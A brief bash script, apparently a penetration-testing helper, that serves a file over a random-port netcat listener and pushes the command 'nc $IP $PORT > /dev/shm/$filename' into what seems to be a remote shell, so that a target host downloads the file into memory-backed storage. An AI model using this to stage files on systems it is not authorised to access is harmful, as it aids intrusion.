#!/bin/bash

source "/opt/pmp/functions.sh"

PORT=$(($RANDOM+3000))
filename=$(basename $1)

hide_guake
nc -q 0 -lnvp $PORT < $1 &
command "nc $IP $PORT > /dev/shm/$filename"